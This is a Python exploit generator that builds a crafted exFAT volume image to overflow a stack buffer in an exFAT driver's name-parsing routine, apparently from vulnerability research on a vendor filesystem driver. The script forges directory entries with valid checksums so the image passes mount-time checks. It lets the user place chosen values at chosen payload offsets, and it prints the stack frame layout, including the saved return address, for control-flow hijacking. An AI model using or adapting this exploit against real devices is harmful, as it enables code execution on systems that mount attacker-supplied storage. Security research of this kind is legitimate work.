#!/usr/bin/env python3
"""Craft an exFAT volume that drives exfat_get_uni_name_from_ext_entry()
(vendor/exfat/exfat.c:3622) past the end of its caller's stack buffer.

Unlike round-1's mkcase.py this does NOT synthesise a volume from scratch: it
copies a real `mkfs.exfat` image and only rewrites the root directory (plus the
FAT / allocation bitmap when the root has to grow).  Everything the driver
validates at mount time -- boot checksum, up-case table and its 4-byte
checksum, allocation bitmap -- is whatever mkfs.exfat produced.

The write primitive, exactly:

    for i in 1 .. num_ext-1:                 # num_ext-1 iterations
        copy <=15 u16 from name-dentry i     # 30 bytes, verbatim halfwords
        uniname += 15                        # 30 bytes, unconditional

so the volume author supplies a flat byte string of length 30*(num_ext-1) that
lands at uniname[0..] in the caller's frame.  A 0x0000 halfword terminates that
one fragment early and leaves the remainder of its own 30-byte window
untouched; the loop still advances and continues.

Usage:
  mkimg.py OUT.img --num-ext N [--entries M] [--pattern P]
                   [--put OFF:HEXLE32 ...] [--puth OFF:HEX16 ...]
                   [--base IMG] [--name-len L]

  --num-ext N   FILE_DENTRY_T.num_ext byte (0..255).  num_ext=255 is dead:
                get_entry_set_in_dir does `UINT8 num_entries = num_ext+1` which
                wraps to 0, so es->num_entries<3 and the loop never runs.
  --entries M   how many real 0xC1 name dentries to lay down (default num_ext-1,
                the most the loop can consume).  Fewer proves the type check.
  --pattern     offs16   u16 = 0x8000 | (halfword index)   (default; unique+nonzero)
                ascii    cycling 'A'..'Z' as UTF-16, like round 1
                cN       constant u16 N
  --put O:V     force the 4 payload bytes at byte offset O to little-endian V
  --puth O:V    force the u16 at byte offset O to V
"""
import argparse
import shutil
import struct

SECTOR = 512
DENTRY = 32


class Vol:
    def __init__(self, path):
        self.path = path
        self.d = bytearray(open(path, 'rb').read())
        b = self.d
        self.vol_len = struct.unpack_from('<Q', b, 72)[0]
        self.fat_off = struct.unpack_from('<I', b, 80)[0]
        self.fat_len = struct.unpack_from('<I', b, 84)[0]
        self.heap_off = struct.unpack_from('<I', b, 88)[0]
        self.clu_count = struct.unpack_from('<I', b, 92)[0]
        self.root_clu = struct.unpack_from('<I', b, 96)[0]
        self.sps = 1 << b[109]                      # sectors per cluster
        self.clu_size = self.sps * SECTOR
        assert b[108] == 9, "only 512-byte sectors handled"

    def clu_off(self, c):
        return (self.heap_off + (c - 2) * self.sps) * SECTOR

    def fat_set(self, c, v):
        struct.pack_into('<I', self.d, self.fat_off * SECTOR + c * 4, v)

    def bitmap_params(self):
        """Locate the 0x81 allocation-bitmap dentry in the root cluster."""
        o = self.clu_off(self.root_clu)
        for i in range(self.clu_size // DENTRY):
            e = self.d[o + i * DENTRY: o + (i + 1) * DENTRY]
            if e[0] == 0x81:
                return (struct.unpack_from('<I', e, 20)[0],
                        struct.unpack_from('<Q', e, 24)[0])
        raise SystemExit("no allocation bitmap dentry in root")

    def bitmap_set(self, clu):
        bm_clu, _ = self.bitmap_params()
        bit = clu - 2
        p = self.clu_off(bm_clu) + bit // 8
        self.d[p] |= 1 << (bit % 8)

    def free_cluster(self):
        bm_clu, _ = self.bitmap_params()
        base = self.clu_off(bm_clu)
        for c in range(2, self.clu_count + 2):
            bit = c - 2
            if not (self.d[base + bit // 8] >> (bit % 8)) & 1:
                return c
        raise SystemExit("no free cluster")

    def write(self, path):
        open(path, 'wb').write(self.d)


def checksum_2byte(data, chksum=0, dir_entry=False):
    """calc_checksum_2byte(), exfat.c; CS_DIR_ENTRY skips bytes 2 and 3."""
    for i, c in enumerate(data):
        if dir_entry and i in (2, 3):
            continue
        chksum = (((chksum & 1) << 15) | ((chksum & 0xFFFE) >> 1)) + c
        chksum &= 0xFFFF
    return chksum


def build_payload(nbytes, pattern, puts):
    n16 = nbytes // 2
    vals = []
    for k in range(n16):
        if pattern == 'offs16':
            v = 0x8000 | (k & 0x7FFF)
        elif pattern == 'ascii':
            v = 0x41 + (k % 26)
        elif pattern.startswith('c'):
            v = int(pattern[1:], 0)
        else:
            raise SystemExit("bad --pattern")
        vals.append(v)
    for off, v in puts:
        if off % 2:
            raise SystemExit("--put offset must be even")
        if off // 2 >= n16:
            raise SystemExit("--put offset 0x%x beyond payload (%d bytes)" % (off, nbytes))
        vals[off // 2] = v
    return vals


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('out')
    ap.add_argument('--base', default='/var/tmp/samsung-lab/images/good-exfat.img')
    ap.add_argument('--num-ext', type=int, required=True)
    ap.add_argument('--entries', type=int, default=None)
    ap.add_argument('--pattern', default='offs16')
    ap.add_argument('--put', action='append', default=[])
    ap.add_argument('--puth', action='append', default=[])
    ap.add_argument('--name-len', type=int, default=None)
    a = ap.parse_args()

    num_ext = a.num_ext
    n_entries = a.entries if a.entries is not None else max(0, num_ext - 1)

    shutil.copyfile(a.base, a.out)
    v = Vol(a.out)

    puts = []
    for s in a.put:
        o, val = s.split(':')
        val = int(val, 16)
        puts.append((int(o, 0), val & 0xFFFF))
        puts.append((int(o, 0) + 2, (val >> 16) & 0xFFFF))
    for s in a.puth:
        o, val = s.split(':')
        puts.append((int(o, 0), int(val, 16) & 0xFFFF))
    payload_bytes = 30 * max(0, n_entries)
    vals = build_payload(payload_bytes, a.pattern, puts)

    root = v.root_clu
    o = v.clu_off(root)
    slots_per_clu = v.clu_size // DENTRY
    first_free = None
    for i in range(slots_per_clu):
        if v.d[o + i * DENTRY] == 0:
            first_free = i
            break
    if first_free is None:
        raise SystemExit("root cluster full")

    total_slots = 1 + 1 + n_entries          # file + stream + names
    need = first_free + total_slots
    n_clu = (need + slots_per_clu - 1) // slots_per_clu
    chain = [root]
    while len(chain) < n_clu:
        nxt = v.free_cluster()
        v.fat_set(chain[-1], nxt)
        v.fat_set(nxt, 0xFFFFFFFF)
        v.bitmap_set(nxt)
        v.d[v.clu_off(nxt):v.clu_off(nxt) + v.clu_size] = b'\0' * v.clu_size
        chain.append(nxt)

    fe = bytearray(DENTRY)
    fe[0] = 0x85
    fe[1] = num_ext & 0xFF
    struct.pack_into('<H', fe, 4, 0x0020)                 # attr = ARCHIVE
    struct.pack_into('<H', fe, 8, 0x0000)                 # create time
    struct.pack_into('<H', fe, 10, 0x5321)                # create date
    struct.pack_into('<H', fe, 12, 0x0000)
    struct.pack_into('<H', fe, 14, 0x5321)
    struct.pack_into('<H', fe, 16, 0x0000)
    struct.pack_into('<H', fe, 18, 0x5321)

    se = bytearray(DENTRY)
    se[0] = 0xC0
    se[1] = 0x01                                          # flags: allocation
    se[3] = (a.name_len if a.name_len is not None
             else min(255, max(1, n_entries * 15))) & 0xFF
    struct.pack_into('<H', se, 4, 0x0000)                 # name_hash
    struct.pack_into('<Q', se, 8, 0)                      # valid_size
    struct.pack_into('<I', se, 20, 0)                     # start_clu
    struct.pack_into('<Q', se, 24, 0)                     # size

    names = bytearray()
    for k in range(n_entries):
        ne = bytearray(DENTRY)
        ne[0] = 0xC1
        ne[1] = 0
        for j in range(15):
            struct.pack_into('<H', ne, 2 + j * 2, vals[k * 15 + j])
        names += ne

    es = bytes(fe) + bytes(se) + bytes(names)
    cs = checksum_2byte(es[:DENTRY], 0, dir_entry=True)
    for off in range(DENTRY, len(es), DENTRY):
        cs = checksum_2byte(es[off:off + DENTRY], cs, dir_entry=False)
    struct.pack_into('<H', fe, 2, cs)
    es = bytes(fe) + bytes(se) + bytes(names)

    for k in range(total_slots):
        slot = first_free + k
        c = chain[slot // slots_per_clu]
        off = v.clu_off(c) + (slot % slots_per_clu) * DENTRY
        v.d[off:off + DENTRY] = es[k * DENTRY:(k + 1) * DENTRY]

    v.write(a.out)

    zeros = [i * 2 for i, x in enumerate(vals) if x == 0]
    print("%s: num_ext=%d name_dentries=%d root_chain=%s slot0=%d"
          % (a.out, num_ext, n_entries, chain, first_free))
    print("  loop iterations = min(num_ext-1, entries) = %d" % min(num_ext - 1, n_entries))
    print("  bytes written   = %d at uniname[0]" % (30 * min(num_ext - 1, n_entries)))
    print("  ffsReadDir frame: uniname=fp-560; saved r4@+520 .. saved sp@+552, lr(->pc)@+556")
    if zeros:
        print("  NOTE: zero halfwords at payload offsets %s (fragment truncation)" % zeros[:8])


if __name__ == '__main__':
    main()
